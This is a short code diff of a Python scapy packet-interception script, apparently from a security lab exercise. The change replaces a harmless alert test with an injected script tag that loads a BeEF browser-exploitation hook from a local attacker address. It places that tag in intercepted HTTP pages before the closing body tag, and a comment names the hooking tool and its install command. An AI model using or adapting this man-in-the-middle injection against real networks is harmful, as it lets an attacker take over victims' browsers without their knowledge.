@@ -30,7 +30,8 @@ def process_packet(packet):
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] HTTP Respond")
             print(scapy_packet.show())
-            injection_code = "<script>alert('test');</script>"
+            # injects my hook.js code that connects me to beef (apt-get install beef-xss)
+            injection_code = '<script src="http://10.0.2.19:3000/hook.js"></script>'
             load = load.replace("</body>", injection_code+"</body>")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)
             if content_length_search and "text/html" in load:
